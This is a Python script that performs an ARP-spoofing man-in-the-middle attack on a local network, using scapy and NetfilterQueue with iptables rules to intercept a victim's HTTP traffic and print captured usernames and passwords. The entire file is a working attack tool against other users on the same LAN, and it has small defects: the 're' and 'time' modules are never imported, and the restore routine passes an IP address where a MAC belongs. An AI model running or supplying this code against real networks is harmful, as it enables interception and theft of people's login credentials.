#!/usr/bin/env python3

import scapy.all as scapy
import netifaces
import sys
import os
from netfilterqueue import NetfilterQueue

os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

vic = {'ip':'', 'mac':''}
gtw = {'ip':'', 'mac':''}

gateway = netifaces.gateways()['default'][netifaces.AF_INET]
gtw_ip = gateway[0]
iface = gateway[1]

arp = scapy.ARP(pdst=gtw_ip + '/24')
ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

result = scapy.srp(ether/arp, timeout=3, verbose=0)[0]

# print all available device
print("Available devices")
print("-"*41)
print("IP" + " "*20 + "MAC address")
print("-"*41)

for send, recv in result:
    client = {'ip': recv.psrc, 'mac': recv.hwsrc}
    if recv.psrc == gtw_ip:
        gtw = client
    else:
        if  not re.match(r'(.*).254$', client['ip'], re.M):
            print("{:22}{}".format(client['ip'], client['mac']))
            vic = client

def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2, pdst=targetIP, hwdst="aa:aa:aa:aa:aa:aa", psrc=spoofIP)
    scapy.send(packet,verbose=False)

def restore(src, dst):
    packet=scapy.ARP(op=2, pdst=dst['ip'], hwdst=dst['mac'], psrc=src['ip'], hwsrc=src['ip'])
    scapy.send(packet,verbose=False)

def get_user_info(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    try:
        if(scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.src == vic['ip'] and scapy_pkt.dport == 80):
            content = scapy_pkt.getlayer(scapy.Raw).load.decode('utf-8').split("\r\n\r\n")[1]
            info = content.split("&")
            uname = info[0].split("=")[1]
            passwd = info[1].split("=")[1]
       
            print("\n===== Get User Info =====")
            print("username: " + uname + "\npassword: " + passwd)
            print("=========================")
    except:
        pass

    pkt.accept()

pkt_cnt = 0

nfqueue = NetfilterQueue()
nfqueue.bind(0, get_user_info)

try:
    pid = os.fork()
    if pid == 0:
        #print("nf queue start")
        nfqueue.run()
    else:
        #print("arp start")
        while True:
            spoofer(vic['ip'], gtw['ip'])
            spoofer(gtw['ip'], vic['ip'])
            pkt_cnt += 2
            print("\r[+] Send ARP packet: " + str(pkt_cnt), end=""),
            time.sleep(2)
except KeyboardInterrupt:
    print("\nSpoofing stop...")
    os.system("iptables --flush")
    nfqueue.unbind()
    restore(vic, gtw)
    restore(gtw, vic)
